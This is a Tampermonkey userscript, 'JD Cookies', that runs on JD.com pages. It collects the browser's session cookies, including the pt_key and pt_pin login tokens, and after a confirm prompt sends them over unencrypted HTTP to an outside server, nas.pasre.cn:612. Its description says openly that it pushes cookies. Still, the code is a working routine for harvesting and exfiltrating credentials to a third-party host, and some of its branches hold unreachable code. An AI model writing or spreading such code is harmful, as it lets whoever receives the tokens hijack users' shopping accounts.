// ==UserScript==
// @name        JD Cookies
// @namespace   http://tampermonkey.net/
// @version     0.9.4
// @description 推送JD Cookies
// @author      mumumi
// @connect     nas.pasre.cn
// @match       *://m.jd.com/*
// @match       *://m.healthjd.com/*
// @match       *://*.m.jd.com/*
// @match       *://wq.jd.com/*
// @match       *://*.wq.jd.com/*
// @match       *://wqs.jd.com/*
// @match       *://*.wqs.jd.com/*
// @match       https://www.jd.com/
// @exclude     *://plogin.m.jd.com/*
// @grant       GM_openInTab
// @grant       GM_xmlhttpRequest
// @grant       GM_cookie
// @run-at      document-end
// @downloadURL https://update.greasyfork.org/scripts/428632/JD%20Cookies.user.js
// @updateURL https://update.greasyfork.org/scripts/428632/JD%20Cookies.meta.js
// ==/UserScript==

(function () {
    'use strict';
    function send(url) {
        GM_xmlhttpRequest({
            method: 'GET',
            url: url,
            onload: function (response) {
                console.log("success", response.responseText);
                alert(response.responseText);
            }
        });
    }
    function getCookies() {
        var r={}, a=document.cookie;
        a.split(';').forEach(function(e){
            var p=e.split('=');
            if (p[0]) r[p.shift().trim()]=p.join('=');
        });
        return r;
    }
    window.onload = function() {
        var main = "https://www.jd.com/";
        var now = new Date().getTime() / 1000;
        if (window.location.href.startsWith(main)) {
            if (document.querySelectorAll("a.nickname").length == 0) {
                alert("请先登录");
            } else {
                GM_cookie.list({}, function(cookies, error) {
                    if (error) {
                        console.log('ck err', error)
                    } else {
                        cookies = cookies.filter(c => !c.expirationDate || c.expirationDate > now);
                        var url = "http://nas.pasre.cn:612/pc?c=";
                        var length = url.length;
                        url += encodeURIComponent(cookies.map(c => c.name + '=' + encodeURIComponent(c.value)).join('; '));
                        if (url.length > length + 800) {
                            console.log(url);
                            return;
                            if (window.confirm('是否提交PC_COOKIE')) {
                                send(url);
                            }
                            if (window.confirm('是否跳转移动端提交JD_COOKIE')) {
                                window.location = 'https://home.m.jd.com/myJd/home.action';
                            }
                        }
                    }
                });
            }
        } else {
            if (window.location.href.startsWith("https://m.healthjd.com/s/my") || document.querySelectorAll("div#msShortcutLogin")[0].style['display'] == 'none') {
                GM_cookie.list({}, function(cookies, error) {
                    var d = {};
                    if (error) {
                        console.log('框架获取CK失败：' + error + '，尝试备用方案')
                        Object.entries(getCookies()).forEach(e => d[e[0]] = e[1]);
                    } else {
                        cookies.filter(c => c.expirationDate > now).forEach(c => d[c.name] = c.value);
                    }
                    if (!('pt_key' in d && 'pt_pin' in d)) {
                        alert('未获取到CK，请手动获取并提交')
                    }
                    var url = "http://nas.pasre.cn:612/?c=";
                    var length = url.length;
                    url += encodeURIComponent('pt_key='+d['pt_key']+';pt_pin='+decodeURIComponent(d['pt_pin'])+';');
                    if (url.length > length + 91) {
                        console.log(url);
                        if (window.confirm('是否提交JD_COOKIE')) {
                            send(url);
                        }
                        return;
                        if (window.confirm('是否跳转主页提交PC_COOKIE')) {
                            GM_openInTab(main);
                        }
                    }
                });
            } else {
                alert("请先登录");
            }
        }
    };
})();